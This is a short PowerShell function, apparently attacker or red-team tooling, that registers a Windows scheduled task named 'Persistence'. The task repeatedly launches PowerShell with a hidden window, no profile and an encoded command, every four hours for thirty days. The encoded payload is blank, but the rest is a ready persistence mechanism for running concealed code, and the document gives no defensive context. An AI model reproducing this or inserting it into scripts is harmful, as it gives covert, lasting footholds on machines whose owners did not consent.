function New-ScheduledTaskPersistence {

    $name = "Persistence"
  
    $trigger = New-ScheduledTaskTrigger `
        -Once `
        -At 11am `
        -RepetitionInterval (New-TimeSpan -Hours 4) `
        -RepetitionDuration (New-TimeSpan -Days 30)
  
      $action = New-ScheduledTaskAction `
        -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -Argument "-Sta -Nop -Window Hidden -EncodedCommand " `
        -WorkingDirectory "C:\Windows\System32"
  
      Register-ScheduledTask `
        -TaskName $name `
        -Trigger $trigger `
        -Action $action `
        -Force
}
